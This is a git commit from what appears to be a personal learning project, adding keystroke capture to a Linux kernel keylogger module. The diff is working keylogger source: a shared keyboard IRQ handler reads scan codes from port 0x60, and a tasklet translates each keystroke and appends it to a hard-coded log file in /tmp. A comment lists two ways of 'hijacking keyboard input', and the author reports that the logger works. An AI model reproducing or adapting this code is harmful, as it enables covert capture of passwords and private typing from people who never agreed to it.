8cb8d288855d83dd56a21f28b832462d8630b6f2
Joseph Harkleroad <hark130@yahoo.com>
2018-09-23 19:07:02 -0500

    key: Key Logger Solution #1 Complete
    The following additions are in this commit:
    	- Better organized LKM macros
    	- Added conditional compilation macro so I can later implement Solution #2 once #1 is complete (SPOILER ALERT: It is!)
    	- Updated prototype/implementation of translate_code() so that it informs the caller when it has received an unsupported value
    	- Added request for irq to init
    	- Registered tasklet to handle print requirements
    	- Updated exit function to release the irq and the tasklet
    	- Defined irq handler function
    	- Defined tasklet logger
    	- Added numerous printk DEBUGGING statements
    	- Commented out most of the 'noise' printk statements
    	- Various other small unmentionable updates
    
    GREAT NEWS everyone... Solution #1 for my key logger is functional.  After being loaded, it logs keystrokes into a hard-coded file defined in the module.
    
    Next step, implement Solution #2 (which is actually probably preferable to #1).
    
    Changes to be committed:
    	modified:   myKeyLoggingModule.c

--- Modules/myKeyLogger/myKeyLoggingModule.c
+++ Modules/myKeyLogger/myKeyLoggingModule.c
@@ -13,6 +13,7 @@
 #include <asm/uaccess.h>                        // get_fs(), set_fs()
 #include "HarkleKerror.h"                       // Kernel error macros
 #include <linux/fcntl.h>                        // filp_open(), filp_close()
+#include <linux/interrupt.h>                    // irq_handler_t
 #include <linux/fs.h>                           // Defines file table structures
 #include <linux/kernel.h>                       // ALWAYS NEED
 #include <linux/module.h>                       // ALWAYS NEED
@@ -21,6 +22,8 @@
 ////////////
 /* MACROS */
 ////////////
+
+// GENERAL //
 #define DEVICE_NAME "My Key Logger"            // Use this macro for logging
 // #define HARKLE_KERROR(module, funcName, errMsg) do { printk(KERN_ERR "%s: <<<ERROR>>> %s - %s\n", module, #funcName, errMsg); } while (0);
 // #define HARKLE_KERRNO(module, funcName, errNum) do { printk(KERN_ERR "%s: <<<ERROR>>> %s() returned %d!\n", module, #funcName, errNum); } while (0);
@@ -32,12 +35,26 @@
 #ifndef FALSE
 #define FALSE 0
 #endif  // FALSE
+
+// LOGGING //
 #define DEF_LOG_FILENAME "/tmp/myKeyLog.txt"
 #define DEF_LOG_FLAGS O_WRONLY | O_CREAT | O_APPEND
 // #define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
 #define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH
 #define DEF_LOG_INIT_MSG "***INITIALIZING LOG***\n"
-#define DEF_LOG_CLOSE_MSG "***CLOSING LOG***\n"
+#define DEF_LOG_CLOSE_MSG "\n***CLOSING LOG***\n"
+
+#define SOLUTION 1
+#if SOLUTION == 1
+// SOLUTION #1 - ISR4IRQ
+// Intel-specific magic numbers
+#define KEYBOARD_IRQ 1
+#define KBD_STATUS_REG 0x64
+#define KBD_CNTL_REG 0x64
+#define KBD_DATA_REG 0x60
+#else
+// Placeholder SOLUTION 2
+#endif  // SOLUTION
 
 //////////////
 /* TYPEDEFS */
@@ -64,15 +81,27 @@ static void close_log(struct file *logFile_fp);
 // RETURN - Number of bytes written on success, -1 on failure
 static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset);
 // PURPOSE - Translate scan code to 'key' string
-// RETURN - 0 on success, -1 on failure
+// RETURN - 1 for unsupported value, 0 on success, -1 on failure
 static int translate_code(unsigned char scanCode, char *buf);
+#if SOLUTION == 1
+// PURPOSE - Keyboard IRQ handler
+irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs);  // SOLUTION #1 - ISR4IRQ
+// PURPOSE - Converts scancode to key and writes it to log file
+void tasklet_logger(unsigned long data);
+// Registers the tasklet for logging keys.
+// NOTE: Apparently, it must immediately follow the prototype but precede the definition.
+// Likely because this macro expands to another function prototype.
+DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);  // SOLUTION #1 - ISR4IRQ
+#else
+// Placeholder SOLUTION 2
+#endif  // SOLUTION
 
 /////////////
 /* GLOBALS */
 /////////////
 myKeyLogger myKL;
 int shift;
-// struct task_struct;
+unsigned char sCode;  // SOLUTION #1 - ISR4IRQ
 
 //////////////////////////
 /* FUNCTION DEFINITIONS */
@@ -133,6 +162,25 @@ static int __init key_logger_init(void)
             HARKLE_KERROR(DEVICE_NAME, key_logger_init, "write_log() failed");  // DEBUGGING
         }
     }
+
+    if (!retVal)
+    {
+#if SOLUTION == 1
+        // Request to register a shared IRQ handler (ISR).
+        retVal = request_irq(KEYBOARD_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED, DEVICE_NAME, &sCode);
+
+        if (!retVal)
+        {
+            HARKLE_KFINFO(DEVICE_NAME, key_logger_init, "ISR registered");  // DEBUGGING
+        }
+        else
+        {
+            HARKLE_KERROR(DEVICE_NAME, key_logger_init, "request_irq() failed to register a shared IRQ handler");  // DEBUGGING
+        }
+#else
+// Placeholder SOLUTION 2
+#endif  // SOLUTION
+    }
     
     // DONE
     HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");  // DEBUGGING
@@ -145,6 +193,18 @@ static void __exit key_logger_exit(void)
     int msgLen = strlen(DEF_LOG_CLOSE_MSG);
 
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING
+
+#if SOLUTION == 1
+    // SOLUTION #1 - ISR4IRQ
+    // Free the logging tasklet.
+    tasklet_kill(&my_tasklet);
+
+    // Free the shared IRQ handler, giving system back original control.
+    free_irq(KEYBOARD_IRQ, &sCode);
+#else
+// Placeholder SOLUTION 2
+#endif  // SOLUTION
+
     // Close Key Logging File
     if (myKL.log_fp)
     {
@@ -242,11 +302,14 @@ static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int 
     if (!logFile_fp || !data)
     {
         HARKLE_KERROR(DEVICE_NAME, write_log, "NULL Pointer");  // DEBUGGING
+        // printk(KERN_DEBUG "%s: Data was %s\n", DEVICE_NAME, data);  // DEBUGGING
         retVal = -1;
     }
     else if (!(*data) || !size)
     {
         HARKLE_KERROR(DEVICE_NAME, write_log, "Empty string");  // DEBUGGING
+        // printk(KERN_DEBUG "data == %s\n", data);  // DEBUGGING
+        // printk(KERN_DEBUG "size == %u\n", size);  // DEBUGGING
         retVal = -1;
     }
     else
@@ -262,7 +325,7 @@ static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int 
         }
         else if (retVal > 0)
         {
-            printk(KERN_INFO "%s: vfs_write wrote %d bytes\n", DEVICE_NAME, retVal);
+            // printk(KERN_INFO "%s: vfs_write wrote %d bytes\n", DEVICE_NAME, retVal);
         }
         else
         {
@@ -274,6 +337,87 @@ static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int 
 
     return retVal;
 }
+
+/*
+ *  TWO WAYS OF HIJACKING KEYBOARD INPUT
+ *
+ *  1. Interrupt Service Routine (ISR) for a keyboard Interrupt Request Line (IRQ)
+ *      - Works for older versions of the kernel... KERNEL_VERSION(2,4,9)
+ *  2. Register a module with the notification list maintained by the keyboard driver
+ *      - Appears to be most common
+ */
+
+#if SOLUTION == 1
+// 1. ISR for a keyboard IRQ
+// NOTE: This implementation is adapted from:
+// https://github.com/b1uewizard/linux-keylogger/blob/master/kb.c
+
+// SOLUTION #1 - ISR4IRQ
+irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
+{
+    // Receive the scan code
+    sCode = inb(KBD_DATA_REG);
+
+    if (sCode)
+    {
+        // printk(KERN_DEBUG "inb() returned %u\n", sCode);  // DEBUGGING
+
+        /* We want to avoid I/O in an ISR, so schedule a Linux tasklet to
+         * write the key to the log file at the next available time in a
+         * non-atomic context.
+         */
+        tasklet_schedule(&my_tasklet);
+    }
+
+    return (irq_handler_t)IRQ_HANDLED;
+}
+
+/* Converts scancode to key and writes it to log file. */
+void tasklet_logger(unsigned long data)
+{
+    // LOCAL VARIABLES
+    int msgLen = 0;  // Length of human readable string from converted scan code
+    int tempRetVal = 0;  // translate_code() return value
+
+    // 1. Convert data to string
+    tempRetVal = translate_code(sCode, myKL.keyStr);
+
+    if (-1 == tempRetVal)
+    // if (translate_code(data, myKL.keyStr))
+    {
+        HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "translate_code() has failed");  // DEBUGGING
+    }
+    else if (0 == tempRetVal)
+    {
+        // 2. Write string to log file
+        // static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset);
+        msgLen = strlen(myKL.keyStr);
+        // printk(KERN_DEBUG "myKL.keyStr == %s\n", myKL.keyStr);  // DEBUGGING
+        // printk(KERN_DEBUG "strlen(myKL.keyStr) == %d\n", msgLen);  // DEBUGGING
+
+        // NOTES:
+        //  - msgLen > 0 avoids empty strings (due to unsupported values)
+        //  - myKL.log_fp (!= NULL) avoids the final (ENTER) in the queue that comes through after the _exit() is called
+        if (msgLen > 0 && myKL.log_fp)
+        {
+            if (msgLen != write_log(myKL.log_fp, myKL.keyStr, msgLen, myKL.logOffset))
+            {
+                HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_log() has failed");  // DEBUGGING
+            }
+        }
+    }
+    else
+    {
+        // Unsupported value
+        // printk(KERN_DEBUG "Skipping unsupported value of %u\n", sCode);  // DEBUGGING
+    }
+
+    // DONE
+    return;
+}
+#else
+// Placeholder SOLUTION 2
+#endif  // SOLUTION
 
 static int translate_code(unsigned char scanCode, char *buf)
 {
@@ -449,7 +593,8 @@ static int translate_code(unsigned char scanCode, char *buf)
             case 84:
                 tempRetVal = strncpy(buf, "(SYSRQ)", BUFF_SIZE); break;
             default:
-                printk(KERN_INFO "%s: translate_code() received unsupported scan code of %u.\n", DEVICE_NAME, scanCode);  // DEBUGGING
+                // printk(KERN_INFO "%s: translate_code() received unsupported scan code of %u.\n", DEVICE_NAME, scanCode);  // DEBUGGING
+                retVal = 1;
                 tempRetVal = buf;
                 break;
         }
@@ -460,7 +605,7 @@ static int translate_code(unsigned char scanCode, char *buf)
         }
         else if (*tempRetVal)
         {
-            printk(KERN_INFO "%s: Translated %u into '%s'\n", DEVICE_NAME, scanCode, buf);  // DEBUGGING
+            // printk(KERN_INFO "%s: Translated %u into '%s'\n", DEVICE_NAME, scanCode, buf);  // DEBUGGING
         }
     }
     else
@@ -481,3 +626,6 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Joseph 'Makleford' Harkleroad");
 MODULE_DESCRIPTION("A basic key logging Linux Kernel Module");
 MODULE_VERSION("0.1"); // Not yet releasable
+
+// unsigned char inb(unsigned short int port)
+// https://www.systutorials.com/docs/linux/man/1-inb/
